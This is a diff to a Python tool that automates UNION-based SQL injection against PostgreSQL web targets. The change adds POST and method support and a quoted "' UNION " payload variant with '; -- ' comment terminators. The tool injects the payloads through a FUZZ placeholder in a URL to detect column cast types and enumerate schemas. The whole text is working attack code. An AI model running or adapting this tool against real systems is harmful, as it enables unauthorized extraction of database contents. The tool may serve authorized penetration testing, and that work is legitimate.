@@ -1,6 +1,6 @@
-from requests import request
 from sys import exit
 from enum import Enum
+from http_utils import request_handler
 
 
 CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_'
@@ -21,7 +21,9 @@ def enumerate(opts, poison, base_poison, known_list, name_alias):
             poison_str += "; -- "
 
             poison_url = opts.URL.replace("FUZZ", poison_str)
-            response = request("get", poison_url).text
+            response = request_handler(opts.METHOD, poison_url,
+                                       opts.DATA, poison_str)
+            response = response.text
 
             if opts.SUCCESS_STR in response and opts.ERROR_STR in response:
                 print(
@@ -108,21 +110,23 @@ class Postgresql_Enumerator():
             NUMERIC = r"SELECT (regexp_match(version(), '\d+'))[1]::int"
 
         nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
-        base_poison = "0 UNION "
+        base_poisons = ["' UNION ", "0 UNION "]
         poisons = [Type.NUMERIC, Type.TEXT]
 
-        for poison in poisons:
-            target = opts.URL.replace("FUZZ", f"{base_poison}{
-                                      poison.value}{nulls}")
-            result = request("get", target)
-            result = result.text
+        for base_poison in base_poisons:
+            for poison in poisons:
+                poison_str = f"{base_poison}{poison.value}{nulls}; -- "
+                target = opts.URL.replace("FUZZ", poison_str)
+                result = request_handler(
+                    opts.METHOD, target, opts.DATA, poison_str)
+                result = result.text
 
-            if opts.ERROR_STR not in result:  # we be a lil' loosey goosey
-                # TODO: expand this
-                if poison == Type.NUMERIC:
-                    return CastType.NUMERIC
-                else:
-                    return CastType.ALNUM
+                if opts.ERROR_STR not in result:  # we be a lil' loosey goosey
+                    # TODO: expand this
+                    if poison == Type.NUMERIC:
+                        return CastType.NUMERIC
+                    else:
+                        return CastType.ALNUM
 
     def enumerate_schemas(self, opts, poison, cast_type):
         nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
